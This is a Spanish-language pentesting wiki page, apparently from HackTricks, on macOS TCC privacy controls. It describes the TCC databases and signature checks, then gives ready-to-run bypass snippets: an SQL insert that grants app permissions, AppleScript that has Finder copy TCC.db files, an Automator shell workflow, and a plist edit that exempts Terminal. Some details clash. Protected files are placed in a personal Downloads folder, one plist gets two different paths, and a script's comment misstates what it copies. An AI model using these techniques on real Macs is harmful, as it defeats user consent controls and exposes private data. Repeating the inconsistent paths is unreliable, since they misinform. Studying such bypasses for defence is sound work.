# macOS TCC

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Información básica**

**TCC (Transparency, Consent, and Control)** es un mecanismo en macOS para **limitar y controlar el acceso de las aplicaciones a ciertas funciones**, generalmente desde una perspectiva de privacidad. Esto puede incluir cosas como servicios de ubicación, contactos, fotos, micrófono, cámara, accesibilidad, acceso completo al disco y muchas más.

Desde la perspectiva del usuario, se ve a TCC en acción **cuando una aplicación quiere acceder a una de las funciones protegidas por TCC**. Cuando esto sucede, el **usuario recibe un cuadro de diálogo** que le pregunta si desea permitir el acceso o no.

También es posible **conceder acceso a las aplicaciones** a archivos mediante **intenciones explícitas** de los usuarios, por ejemplo, cuando un usuario **arrastra y suelta un archivo en un programa** (obviamente, el programa debe tener acceso a él).

![Un ejemplo de un cuadro de diálogo de TCC](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** es manejado por el **daemon** ubicado en `/System/Library/PrivateFrameworks/TCC.framework/Support/tccd` y configurado en `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (registrando el servicio mach `com.apple.tccd.system`).

Hay un **tccd en modo de usuario** en ejecución por cada usuario conectado, definido en `/System/Library/LaunchAgents/com.apple.tccd.plist`, registrando los servicios mach `com.apple.tccd` y `com.apple.usernotifications.delegate.com.apple.tccd`.

Aquí puedes ver el tccd en ejecución como sistema y como usuario:
```bash
ps -ef | grep tcc
0   374     1   0 Thu07PM ??         2:01.66 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd system
501 63079     1   0  6:59PM ??         0:01.95 /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
```
Los permisos se heredan de la aplicación principal y se rastrean en función del ID de paquete y el ID de desarrollador.

### Bases de datos de TCC

Las autorizaciones/denegaciones se almacenan en algunas bases de datos de TCC:

* La base de datos de todo el sistema en **`/Library/Application Support/com.apple.TCC/TCC.db`**.
* Esta base de datos está protegida por SIP, por lo que solo se puede escribir en ella mediante un bypass de SIP.
* La base de datos de TCC del usuario **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** para preferencias por usuario.
* Esta base de datos está protegida, por lo que solo los procesos con privilegios de TCC altos, como el Acceso completo al disco, pueden escribir en ella (pero no está protegida por SIP).

{% hint style="warning" %}
Las bases de datos anteriores también están protegidas por TCC para el acceso de lectura. Por lo tanto, no podrás leer tu base de datos de TCC de usuario regular a menos que sea desde un proceso con privilegios de TCC.

Sin embargo, recuerda que un proceso con estos privilegios altos (como FDA o `kTCCServiceEndpointSecurityClient`) podrá escribir en la base de datos de TCC de los usuarios.
{% endhint %}

* Hay una tercera base de datos de TCC en **`/var/db/locationd/clients.plist`** para indicar los clientes permitidos para acceder a los servicios de ubicación.
* El archivo protegido por SIP **`/Users/carlospolop/Downloads/REG.db`** (también protegido del acceso de lectura con TCC) contiene la ubicación de todas las bases de datos de TCC válidas.
* El archivo protegido por SIP **`/Users/carlospolop/Downloads/MDMOverrides.plist`** (también protegido del acceso de lectura con TCC) contiene más permisos otorgados por TCC.
* El archivo protegido por SIP **`/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist`** (pero legible por cualquiera) es una lista de aplicaciones que requieren una excepción de TCC.&#x20;

{% hint style="success" %}
La base de datos de TCC en **iOS** se encuentra en **`/private/var/mobile/Library/TCC/TCC.db`**
{% endhint %}

{% hint style="info" %}
La **interfaz de usuario del centro de notificaciones** puede realizar cambios en la base de datos de TCC del sistema:

{% code overflow="wrap" %}
```bash
codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
[..]
com.apple.private.tcc.manager
com.apple.rootless.storage.TCC
```
{% endcode %}

Sin embargo, los usuarios pueden **eliminar o consultar reglas** con la utilidad de línea de comandos **`tccutil`**.
{% endhint %}

#### Consultar las bases de datos

{% tabs %}
{% tab title="Base de datos de usuario" %}
{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}

{% tab title="base de datos del sistema" %}
{% code overflow="wrap" %}
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Get all FDA
sqlite> select service, client, auth_value, auth_reason from access where service = "kTCCServiceSystemPolicyAllFiles" and auth_value=2;

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endcode %}
{% endtab %}
{% endtabs %}

{% hint style="success" %}
Al verificar ambas bases de datos, puedes verificar los permisos que una aplicación ha permitido, ha prohibido o no tiene (solicitará permiso).
{% endhint %}

* El **`servicio`** es la representación de cadena de permisos de TCC
* El **`cliente`** es el **ID de paquete** o **ruta al binario** con los permisos
* El **`tipo de cliente`** indica si es un Identificador de paquete(0) o una ruta absoluta(1)

<details>

<summary>Cómo ejecutar si es una ruta absoluta</summary>

Simplemente haz **`launctl load you_bin.plist`**, con un plist como:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<!-- Label for the job -->
<key>Label</key>
<string>com.example.yourbinary</string>

<!-- The path to the executable -->
<key>Program</key>
<string>/path/to/binary</string>

<!-- Arguments to pass to the executable (if any) -->
<key>ProgramArguments</key>
<array>
<string>arg1</string>
<string>arg2</string>
</array>

<!-- Run at load -->
<key>RunAtLoad</key>
<true/>

<!-- Keep the job alive, restart if necessary -->
<key>KeepAlive</key>
<true/>

<!-- Standard output and error paths (optional) -->
<key>StandardOutPath</key>
<string>/tmp/YourBinary.stdout</string>
<key>StandardErrorPath</key>
<string>/tmp/YourBinary.stderr</string>
</dict>
</plist>
```
</details>

* El campo **`auth_value`** puede tener diferentes valores: denied(0), unknown(1), allowed(2) o limited(3).
* El campo **`auth_reason`** puede tener los siguientes valores: Error(1), Consentimiento del usuario(2), Configuración del usuario(3), Configuración del sistema(4), Política de servicio(5), Política de MDM(6), Política de anulación(7), Cadena de uso faltante(8), Tiempo de espera de la solicitud(9), Preflight desconocido(10), Con derecho(11), Política de tipo de aplicación(12).
* El campo **csreq** está ahí para indicar cómo verificar el binario a ejecutar y otorgar los permisos de TCC:
```bash
# Query to get cserq in printable hex
select service, client, hex(csreq) from access where auth_value=2;

# To decode it (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
BLOB="FADE0C000000003000000001000000060000000200000012636F6D2E6170706C652E5465726D696E616C000000000003"
echo "$BLOB" | xxd -r -p > terminal-csreq.bin
csreq -r- -t < terminal-csreq.bin

# To create a new one (https://stackoverflow.com/questions/52706542/how-to-get-csreq-of-macos-application-on-command-line):
REQ_STR=$(codesign -d -r- /Applications/Utilities/Terminal.app/ 2>&1 | awk -F ' => ' '/designated/{print $2}')
echo "$REQ_STR" | csreq -r- -b /tmp/csreq.bin
REQ_HEX=$(xxd -p /tmp/csreq.bin  | tr -d '\n')
echo "X'$REQ_HEX'"
```
* Para obtener más información sobre los **otros campos** de la tabla, [**consulta esta publicación de blog**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).

También puedes verificar los **permisos ya otorgados** a las aplicaciones en `Preferencias del Sistema --> Seguridad y Privacidad --> Privacidad --> Archivos y Carpetas`.

{% hint style="success" %}
Los usuarios _pueden_ **eliminar o consultar reglas** utilizando **`tccutil`**.&#x20;
{% endhint %}

#### Restablecer los permisos de TCC
```bash
# You can reset all the permissions given to an application with
tccutil reset All app.some.id

# Reset the permissions granted to all apps
tccutil reset All
```
### Verificación de firmas de TCC

La **base de datos** de TCC almacena el **ID del paquete** de la aplicación, pero también **almacena** **información** sobre la **firma** para **asegurarse** de que la aplicación que solicita usar un permiso sea la correcta.

{% code overflow="wrap" %}
```bash
# From sqlite
sqlite> select service, client, hex(csreq) from access where auth_value=2;
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"
```
{% endcode %}

{% hint style="warning" %}
Por lo tanto, otras aplicaciones que utilicen el mismo nombre y ID de paquete no podrán acceder a los permisos otorgados a otras aplicaciones.
{% endhint %}

### Permisos de Entitlements y TCC

Las aplicaciones no solo necesitan solicitar y obtener acceso a algunos recursos, sino que también necesitan tener los entitlements relevantes. Por ejemplo, Telegram tiene el entitlement `com.apple.security.device.camera` para solicitar acceso a la cámara. Una aplicación que no tenga este entitlement no podrá acceder a la cámara (y ni siquiera se le pedirá permiso al usuario).

Sin embargo, para que las aplicaciones accedan a ciertas carpetas del usuario, como `~/Desktop`, `~/Downloads` y `~/Documents`, no necesitan tener ningún entitlement específico. El sistema manejará el acceso de forma transparente y solicitará permiso al usuario según sea necesario.

Las aplicaciones de Apple no generarán solicitudes. Contienen derechos preconcedidos en su lista de entitlements, lo que significa que nunca generarán una ventana emergente ni aparecerán en ninguna de las bases de datos de TCC. Por ejemplo:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
<string>kTCCServiceReminders</string>
<string>kTCCServiceCalendar</string>
<string>kTCCServiceAddressBook</string>
</array>
```
Esto evitará que Calendar solicite al usuario acceso a recordatorios, calendario y la libreta de direcciones.

{% hint style="success" %}
Además de la documentación oficial sobre los permisos, también es posible encontrar **información interesante sobre los permisos** en [**https://newosxbook.com/ent.jl**](https://newosxbook.com/ent.jl)
{% endhint %}

Algunos permisos de TCC son: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... No hay una lista pública que defina todos ellos, pero puedes consultar esta [**lista de los conocidos**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).

### Lugares sensibles sin protección

* $HOME (en sí mismo)
* $HOME/.ssh, $HOME/.aws, etc
* /tmp

### Intención del usuario / com.apple.macl

Como se mencionó anteriormente, es posible **conceder acceso a una aplicación a un archivo arrastrándolo y soltándolo** en ella. Este acceso no se especificará en ninguna base de datos de TCC, sino como un **atributo extendido del archivo**. Este atributo **almacenará el UUID** de la aplicación permitida:
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
{% hint style="info" %}
Es curioso que el atributo **`com.apple.macl`** sea gestionado por el **Sandbox**, no por tccd.

También hay que tener en cuenta que si mueves un archivo que permite el UUID de una aplicación en tu computadora a una computadora diferente, debido a que la misma aplicación tendrá diferentes UIDs, no otorgará acceso a esa aplicación.
{% endhint %}

El atributo extendido `com.apple.macl` **no se puede borrar** como otros atributos extendidos porque está **protegido por SIP**. Sin embargo, como se explica en [**esta publicación**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), es posible desactivarlo **comprimiendo** el archivo, **borrándolo** y **descomprimiéndolo**.

## Privilegios de TCC y Bypasses

### Insertar en TCC

Si en algún momento logras obtener acceso de escritura sobre una base de datos de TCC, puedes usar algo como lo siguiente para agregar una entrada (eliminar los comentarios):

<details>

<summary>Ejemplo de inserción en TCC</summary>
```sql
INSERT INTO access (
service,
client,
client_type,
auth_value,
auth_reason,
auth_version,
csreq,
policy_id,
indirect_object_identifier_type,
indirect_object_identifier,
indirect_object_code_identity,
flags,
last_modified,
pid,
pid_version,
boot_uuid,
last_reminded
) VALUES (
'kTCCServiceSystemPolicyDesktopFolder', -- service
'com.googlecode.iterm2', -- client
0, -- client_type (0 - bundle id)
2, -- auth_value  (2 - allowed)
3, -- auth_reason (3 - "User Set")
1, -- auth_version (always 1)
X'FADE0C00000000C40000000100000006000000060000000F0000000200000015636F6D2E676F6F676C65636F64652E697465726D32000000000000070000000E000000000000000A2A864886F7636406010900000000000000000006000000060000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A483756375859565137440000', -- csreq is a BLOB, set to NULL for now
NULL, -- policy_id
NULL, -- indirect_object_identifier_type
'UNUSED', -- indirect_object_identifier - default value
NULL, -- indirect_object_code_identity
0, -- flags
strftime('%s', 'now'), -- last_modified with default current timestamp
NULL, -- assuming pid is an integer and optional
NULL, -- assuming pid_version is an integer and optional
'UNUSED', -- default value for boot_uuid
strftime('%s', 'now') -- last_reminded with default current timestamp
);
```
</details>

### Automatización para FDA\*

El nombre de TCC del permiso de Automatización es: **`kTCCServiceAppleEvents`**\
Este permiso específico de TCC también indica la **aplicación que se puede gestionar** dentro de la base de datos de TCC (por lo que los permisos no permiten gestionar todo).

**Finder** es una aplicación que **siempre tiene FDA** (aunque no aparezca en la interfaz de usuario), por lo que si tienes privilegios de **Automatización** sobre ella, puedes abusar de sus privilegios para **realizar algunas acciones**.\
En este caso, tu aplicación necesitaría el permiso **`kTCCServiceAppleEvents`** sobre **`com.apple.Finder`**.

{% tabs %}
{% tab title="Robar la base de datos TCC.db de los usuarios" %}
```applescript
# This AppleScript will copy the system TCC database into /tmp
osascript<<EOD
tell application "Finder"
set homeFolder to path to home folder as string
set sourceFile to (homeFolder & "Library:Application Support:com.apple.TCC:TCC.db") as alias
set targetFolder to POSIX file "/tmp" as alias

try
duplicate file sourceFile to targetFolder with replacing
on error errMsg
display dialog "Error: " & errMsg
end try
end tell
EOD
```
{% tab title="Robar sistemas TCC.db" %}
```applescript
osascript<<EOD
tell application "Finder"
set sourceFile to POSIX file "/Library/Application Support/com.apple.TCC/TCC.db" as alias
set targetFolder to POSIX file "/tmp" as alias

try
duplicate file sourceFile to targetFolder with replacing
on error errMsg
display dialog "Error: " & errMsg
end try
end tell
EOD
```
{% endtab %}
{% endtabs %}

Esto se puede aprovechar para **escribir tu propia base de datos de TCC de usuario**.

{% hint style="warning" %}
Con este permiso podrás **solicitar al buscador acceso a carpetas restringidas por TCC** y que te dé los archivos, pero hasta donde sé, **no podrás hacer que el buscador ejecute código arbitrario** para abusar completamente de su acceso a FDA.

Por lo tanto, no podrás abusar de todas las habilidades de FDA.
{% endhint %}

Este es el mensaje de TCC para obtener privilegios de automatización sobre el buscador:

<figure><img src="../../../../.gitbook/assets/image.png" alt="" width="244"><figcaption></figcaption></figure>

{% hint style="danger" %}
Ten en cuenta que debido a que la aplicación **Automator** tiene el permiso de TCC **`kTCCServiceAppleEvents`**, puede **controlar cualquier aplicación**, como el buscador. Por lo tanto, si tienes el permiso para controlar Automator, también podrías controlar el **buscador** con un código como el siguiente:
{% endhint %}

<details>

<summary>Obtener una shell dentro de Automator</summary>
```applescript
osascript<<EOD
set theScript to "touch /tmp/something"

tell application "Automator"
set actionID to Automator action id "com.apple.RunShellScript"
tell (make new workflow)
add actionID to it
tell last Automator action
set value of setting "inputMethod" to 1
set value of setting "COMMAND_STRING" to theScript
end tell
execute it
end tell
activate
end tell
EOD
# Once inside the shell you can use the previous code to make Finder copy the TCC databases for example and not TCC prompt will appear
```
</details>

Lo mismo ocurre con la aplicación **Script Editor**, puede controlar Finder, pero usando un AppleScript no se puede forzar a ejecutar un script.

### **Cliente de seguridad de punto final a FDA**

Si tienes **`kTCCServiceEndpointSecurityClient`**, tienes FDA. Fin.

### Política del sistema SysAdmin File a FDA

**`kTCCServiceSystemPolicySysAdminFiles`** permite **cambiar** el atributo **`NFSHomeDirectory`** de un usuario que cambia su carpeta de inicio y, por lo tanto, permite **burlar TCC**.

### Base de datos de TCC de usuario a FDA

Obteniendo **permisos de escritura** sobre la base de datos de **TCC de usuario**, no puedes otorgarte permisos de **`FDA`**, solo el que se encuentra en la base de datos del sistema puede otorgar eso.

Pero puedes otorgarte **derechos de automatización a Finder**, y abusar de la técnica anterior para escalar a FDA\*.

### **Permisos de FDA a TCC**

El nombre de TCC para **Full Disk Access** es **`kTCCServiceSystemPolicyAllFiles`**

No creo que esto sea una escalada de privilegios real, pero por si acaso te resulta útil: si controlas un programa con FDA, puedes **modificar la base de datos de TCC de los usuarios y otorgarte cualquier acceso**. Esto puede ser útil como técnica de persistencia en caso de que pierdas tus permisos de FDA.

### **Bypass de SIP para Bypass de TCC**

La base de datos de TCC del sistema está protegida por SIP, por eso solo los procesos con los **derechos de acceso indicados podrán modificarla**. Por lo tanto, si un atacante encuentra un **bypass de SIP** en un **archivo** (puede modificar un archivo restringido por SIP), podrá:

* **Eliminar la protección** de una base de datos de TCC y otorgarse todos los permisos de TCC. Podría abusar de cualquiera de estos archivos, por ejemplo:
* La base de datos de TCC del sistema
* REG.db
* MDMOverrides.plist

Sin embargo, hay otra opción para abusar de este **bypass de SIP para eludir TCC**, el archivo `/Library/Apple/Library/Bundles/TCC_Compatibility.bundle/Contents/Resources/AllowApplicationsList.plist` es una lista de aplicaciones que requieren una excepción de TCC. Por lo tanto, si un atacante puede **eliminar la protección de SIP** de este archivo y agregar su **propia aplicación**, la aplicación podrá eludir TCC.\
Por ejemplo, para agregar Terminal:
```bash
# Get needed info
codesign -d -r- /System/Applications/Utilities/Terminal.app
```
AllowApplicationsList.plist:

Este archivo es utilizado por el sistema operativo macOS para gestionar la lista de aplicaciones permitidas para acceder a ciertos recursos protegidos por el TCC (Transparency, Consent, and Control). El TCC es un mecanismo de seguridad que protege la privacidad del usuario al controlar el acceso de las aplicaciones a datos sensibles, como la ubicación, los contactos y los eventos del calendario.

En este archivo, puedes especificar las aplicaciones que se les permite acceder a estos recursos protegidos sin solicitar el consentimiento del usuario. Esto puede ser útil en casos en los que una aplicación de confianza necesita acceder a estos datos de forma automática.

El archivo AllowApplicationsList.plist se encuentra en la ruta `/Library/Application Support/com.apple.TCC/`. Puedes editar este archivo para agregar o eliminar aplicaciones de la lista de permitidas.

Es importante tener en cuenta que modificar este archivo requiere privilegios de administrador y puede afectar la seguridad y privacidad del sistema. Se recomienda tener precaución al realizar cambios en este archivo y solo hacerlo si se comprenden completamente las implicaciones.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Services</key>
<dict>
<key>SystemPolicyAllFiles</key>
<array>
<dict>
<key>CodeRequirement</key>
<string>identifier &quot;com.apple.Terminal&quot; and anchor apple</string>
<key>IdentifierType</key>
<string>bundleID</string>
<key>Identifier</key>
<string>com.apple.Terminal</string>
</dict>
</array>
</dict>
</dict>
</plist>
```
### Bypasses de TCC

{% content-ref url="macos-tcc-bypasses/" %}
[macos-tcc-bypasses](macos-tcc-bypasses/)
{% endcontent-ref %}

## Referencias

* [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
* [**https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command**](https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command)
* [**https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/)
*   [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
